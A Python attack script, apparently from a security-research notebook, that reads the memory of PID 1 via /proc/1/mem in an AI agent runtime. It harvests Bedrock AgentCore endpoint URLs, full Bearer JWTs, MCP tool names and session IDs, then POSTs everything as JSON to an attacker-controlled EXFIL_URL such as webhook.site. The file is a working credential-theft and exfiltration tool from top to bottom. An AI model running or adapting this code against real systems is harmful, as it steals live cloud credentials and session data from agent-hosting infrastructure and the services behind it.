"""Notebook-15 §4.7 — blind recon + exfil of remote_mcp topology from PID 1.

Combines pid1_mcp_blind_recon.py's structural-anchor scanning with outbound
POST to an attacker-controlled URL. Recovers URLs, Bearer tokens, tool names,
pydantic class names, session IDs, and descriptions — then ships the whole
topology as one JSON blob to EXFIL_URL.

Env:
  EXFIL_URL — destination URL (e.g. webhook.site). Required.
"""
import hashlib
import json
import os
import re
import sys
import urllib.error
import urllib.request


ANCHORS = [
    ('HarnessRemoteMcpConfig', 'pydantic_remote_mcp_config'),
    ('HarnessTool', 'pydantic_harness_tool'),
    ('HarnessHeaders', 'pydantic_harness_headers'),
    ('HarnessToolType', 'pydantic_tool_type_enum'),
    ('bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'agentcore_runtime_url_prefix'),
    ('HTTP/1.1 200 OK', 'http_response_status'),
    ('authorization: Bearer', 'authorization_header_lc'),
    ('Authorization: Bearer', 'authorization_header_tc'),
    ('server: uvicorn', 'uvicorn_server_header'),
    ('"method":"initialize"', 'mcp_initialize'),
    ('"method":"tools/list"', 'mcp_tools_list'),
    ('"method":"tools/call"', 'mcp_tools_call'),
    ('"protocolVersion":"2024-11-05"', 'mcp_protocol_version'),
    ('"toolSpec":{"name":"', 'bedrock_toolspec'),
    ('eyJraWQiOi', 'jwt_with_kid_first'),
    ('eyJhbGciOi', 'jwt_with_alg_first'),
]

URL_RE = re.compile(
    rb'https://bedrock-agentcore\.[a-z0-9\-]+\.amazonaws\.com/runtimes/[A-Za-z0-9%_\-/.?=]+'
)
TOOLSPEC_RE = re.compile(rb'"toolSpec":\s*\{\s*"name":\s*"([A-Za-z0-9_\-]+)"')
MCP_TOOL_RE = re.compile(rb'"name":"([A-Za-z][A-Za-z0-9_\-]+)","description":"')
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')
CLASS_RE = re.compile(rb'(Harness[A-Z][A-Za-z0-9]+)')
SESSION_RE = re.compile(rb'session\.id[\s\x00-\x20\x12\x2a\x0a\x28(]+([A-F0-9][A-F0-9\-]{16,80})')
DESC_RE = re.compile(rb'<p>([A-Z][^<]{5,80})</p>')

KNOWN_TOOL_TYPES = (
    b'remote_mcp', b'inline_function', b'agentcore_browser',
    b'agentcore_code_interpreter', b'agentcore_gateway',
)


def scan_pid1():
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-') or path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                regions.append((int(start_s, 16), int(end_s, 16)))
            except Exception:
                continue

    urls = set()
    bearers = set()
    tools = set()
    tool_types = set()
    class_names = set()
    session_ids = set()
    descriptions = set()
    anchor_hits = {}

    with open('/proc/1/mem', 'rb') as mem:
        for start, end in regions:
            try:
                mem.seek(start)
                chunk = mem.read(end - start)
            except Exception:
                continue

            for m in URL_RE.finditer(chunk):
                raw = m.group(0).decode('utf-8', errors='replace')
                urls.add(raw)

            for m in TOOLSPEC_RE.finditer(chunk):
                tools.add(m.group(1).decode('ascii', errors='replace'))
            for m in MCP_TOOL_RE.finditer(chunk):
                tools.add(m.group(1).decode('ascii', errors='replace'))

            for m in JWT_RE.finditer(chunk):
                tok = m.group(0)
                if len(tok) >= 600:
                    bearers.add(tok)

            for tt in KNOWN_TOOL_TYPES:
                if tt in chunk:
                    tool_types.add(tt.decode('ascii'))

            for m in CLASS_RE.finditer(chunk):
                cn = m.group(1).decode('ascii', errors='replace')
                if cn != 'Harness':
                    class_names.add(cn)

            for m in SESSION_RE.finditer(chunk):
                session_ids.add(m.group(1).decode('ascii', errors='replace'))

            for m in DESC_RE.finditer(chunk):
                descriptions.add(m.group(1).decode('utf-8', errors='replace'))

            for needle_str, label in ANCHORS:
                needle_b = needle_str.encode('utf-8')
                count = chunk.count(needle_b)
                if count > 0:
                    anchor_hits[label] = anchor_hits.get(label, 0) + count

    # Dedupe URLs: discard any URL that is a prefix of a longer one.
    urls = {u for u in urls if not any(other.startswith(u) and other != u for other in urls)}

    bearer_list = []
    for tok in sorted(bearers, key=lambda b: -len(b)):
        tok_str = tok.decode('ascii', errors='replace')
        sha = hashlib.sha256(tok).hexdigest()
        bearer_list.append({
            'token': tok_str,
            'len': len(tok_str),
            'sha256': sha,
        })

    print(f'SCAN_CLASSES_LOCAL={len(class_names)}')
    for cn in sorted(class_names):
        print(f'  CLASS={cn}')

    return {
        'urls': sorted(urls),
        'bearers': bearer_list,
        'tools': sorted(tools),
        'tool_types': sorted(tool_types),
        'session_ids': sorted(session_ids),
        'descriptions': sorted(descriptions)[:20],
        'anchor_hits': anchor_hits,
    }


def main():
    exfil_url = os.environ.get('EXFIL_URL')
    if not exfil_url:
        print('EXFIL_FAIL=missing_EXFIL_URL')
        sys.exit(1)
    print(f'EXFIL_TARGET={exfil_url}')

    print('SCAN_START=1')
    topology = scan_pid1()
    print(f'SCAN_URLS={len(topology["urls"])}')
    print(f'SCAN_BEARERS={len(topology["bearers"])}')
    print(f'SCAN_TOOLS={len(topology["tools"])}')
    print(f'SCAN_TOOL_TYPES={len(topology["tool_types"])}')
    print(f'SCAN_SESSIONS={len(topology["session_ids"])}')
    print(f'SCAN_DESCRIPTIONS={len(topology["descriptions"])}')
    total = (
        len(topology['urls']) + len(topology['bearers']) + len(topology['tools'])
        + len(topology['tool_types']) + len(topology['session_ids'])
        + len(topology['descriptions'])
    )
    print(f'SCAN_TOTAL_ARTIFACTS={total}')

    payload = json.dumps({
        'event': 'MCP_BLIND_RECON_EXFIL',
        'topology': topology,
    }).encode()

    req = urllib.request.Request(
        exfil_url,
        data=payload,
        headers={'Content-Type': 'application/json'},
        method='POST',
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            print(f'EXFIL_STATUS={resp.status}')
            print(f'EXFIL_BYTES_SENT={len(payload)}')
            print('EXFIL_VERDICT=POSTED')
    except urllib.error.HTTPError as e:
        print(f'EXFIL_STATUS={e.code}')
        print('EXFIL_VERDICT=FAIL')
    except Exception as e:
        print(f'EXFIL_ERROR={type(e).__name__}: {str(e)[:150]}')
        print('EXFIL_VERDICT=FAIL')


if __name__ == '__main__':
    main()
